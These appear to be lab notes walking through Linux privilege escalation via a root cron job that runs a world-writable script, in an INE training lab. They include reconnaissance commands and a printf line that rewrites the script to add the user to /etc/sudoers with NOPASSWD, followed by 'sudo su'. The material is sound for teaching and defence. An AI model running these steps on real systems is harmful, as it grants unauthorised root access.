Cron Jobs
- Linux implements task scheduling through a utility called Cron.
- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specific schedule.
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created by the active user.

Exploiting Misconfigured Cron Jobs
- Cron jobs can also be run as any user on the system, this is a very important factor to keep in mind, as we will be targeting Cron jobs that have been configured to be run as the "root" user.
- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
- In order to elevate our privileges, we will need to find and identify Cron jobs scheduled by the root user or the files being processed by the Cron job.

Practical Demonstration
- Since the demonstration is for Privilege escalation, we are in an assumed breach scenario with non-elevated privileges, and have access to a Bash shell, with the user student, who does not have elevated privileges.
- `whoami`
- `groups student`
- `cat /etc/passwd`
- `crontab -l`
- `ls -al`
- Upon listing the contents of the current directory, we are able to observe that we have a file named 'message', with the owner set as the root user.
- `pwd`
- `cat message`
- The above command fails because the user permissions set for the file are `-rw-------`, the read and write permissions for the file lie only with the root user.
- Since we know the path to the file being considered, we can try to find any files that specify the file's path.
- `cd /`
- `grep -rnw /usr -e "home/student/message"`
- By executing the previous command, we get a resulting path for a file that specifies the file being considered. The path to the file where the 'message' file's path is specified is `/usr/local/share/copy.sh`.
- The occurrence of the 'message' file's path in the 'copy.sh' file helps us figure out that during the execution of the 'copy.sh' file, the 'message' file gets transferred to the `/tmp` directory.
- `ls -al /tmp`
- `cat /tmp/message`
- We were now able to cat the contents of the message file, which just nudged us for not being a root user.
- Next, we want to check the permissions for the 'copy.sh' file.
- `ls -al /usr/local/share/copy.sh`
- The 'copy.sh' file has its permissions set as `-rwxrwxrwx`, which means that anybody can perform any file operations on this file.
- Since we know that this file is getting executed by a Cron job with root privileges, we can try to utilize it to perform privilege escalation.
- In the case of the lab environment provided by INE, the Cron job is set to execute every minute.
- `cat /usr/local/share/copy.sh`
- Contents of the file:
``` bash
#!/bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message
```
- `vim`
- `nano`
- No text editors were found to be installed on the system, so we are going to use the `printf` command instead.
- `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh\n`
- `cat /usr/local/share/copy.sh`
- `sudo -l`
- The `sudo -l` command can be used to list the sudo execution permissions for the current user, so we used it to check what commands can be run by our user, with and without using a password, to execute something with sudo privileges.
- `sudo su`
- `whoami`
- `cd /root`
- `ls`
- `cat flag`
- `crontab -l` will now provide us with a list of the active Cron jobs for the root user, including the one we just utilized to perform privilege escalation on the target system.

Points to keep in mind while performing privilege escalation with misconfigured Cron jobs
- The first step to perform privilege escalation using misconfigured Cron jobs is to identify the files or scripts that are being used by a Cron job.
- Since, we really cannot be sure about the schedule of execution for the tasks specified in a Cron job, once we've identified the shell script being executed by the Cron job, we can identify if the shell script can be modified by an un-privileged user.
- If the shell script can be modified by a user we have access to, we can modify it and append commands that when run with root privileges, would help us add our current users to sudoers file, enabling us to execute commands with elevated privileges without a password.